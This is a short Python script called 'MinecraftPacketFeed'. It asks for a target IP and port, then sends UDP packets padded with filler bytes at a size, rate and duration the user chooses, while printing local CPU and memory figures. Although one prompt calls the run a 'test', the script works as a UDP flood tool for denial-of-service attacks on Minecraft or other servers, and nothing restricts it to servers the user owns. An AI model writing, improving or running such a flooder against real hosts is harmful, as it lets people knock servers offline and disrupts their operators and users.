import pyfiglet
import socket
import time
import psutil
import threading

# Global variable to control packet sending thread
stop_flag = False

def create_heavy_packet(size_in_bytes):
    # Create a heavy packet (for example, a large message)
    heavy_data = b'A' * size_in_bytes  # Create a byte string consisting of 'A's repeated size_in_bytes times
    return heavy_data

def send_packets(host, port, num_packets_per_second, duration, storage_per_packet):
    global stop_flag
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        packets_sent = 0
        while time.time() < end_time and packets_sent < num_packets_per_second * duration and not stop_flag:
            heavy_packet = create_heavy_packet(storage_per_packet)  # Creating a heavy packet with size_in_bytes
            sock.sendto(heavy_packet, (host, port))  # Sending the heavy packet
            packets_sent += 1
            time.sleep(1.0 / num_packets_per_second)  # Send packets at specified rate
        return packets_sent
    except socket.error as e:
        print(f"Error: {e}")
        return -1

def get_server_info():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    memory_usage = memory.percent
    disk = psutil.disk_usage('/')
    disk_usage = disk.percent
    net = psutil.net_io_counters()
    network_usage = (net.bytes_sent, net.bytes_recv)
    return cpu_usage, memory_usage, disk_usage, network_usage

def stop_packet_sending():
    global stop_flag
    stop_flag = True
    print("Packet sending stopped.")

if __name__ == "__main__":
    T = "MinecraftPacketFeed"
    ASCII_art = pyfiglet.figlet_format(T)
    print(ASCII_art)

    minecraft_host = input("Target IP address: ")
    minecraft_port = int(input("Target port: "))
    duration = int(input("Enter test duration (seconds, max 1000): "))
    num_packets_per_second = int(input("Packets per second (max 1000): "))
    storage_per_packet = int(input("Storage Per Packet (in bytes): "))
    
    # Start packet sending thread
    packet_thread = threading.Thread(target=send_packets, args=(minecraft_host, minecraft_port, num_packets_per_second, duration, storage_per_packet))
    packet_thread.start()
    
    while True:
        command = input("Enter command ('/help' for available commands): ").strip().lower()
        if command == '/help':
            print("Available commands:")
            print("/print cpu - Print CPU usage")
            print("/print memory - Print memory usage")
            print("/stop - Stop sending packets")
            print("/exit - Exit the program")
        elif command == '/print cpu':
            cpu_usage, _, _, _ = get_server_info()
            print(f"CPU Usage: {cpu_usage}%")
        elif command == '/print memory':
            _, memory_usage, _, _ = get_server_info()
            print(f"Memory Usage: {memory_usage}%")
        elif command == '/stop':
            stop_packet_sending()
        elif command == '/exit':
            print("Exiting program.")
            break
        else:
            print("Invalid command. Type '/help' for available commands.")
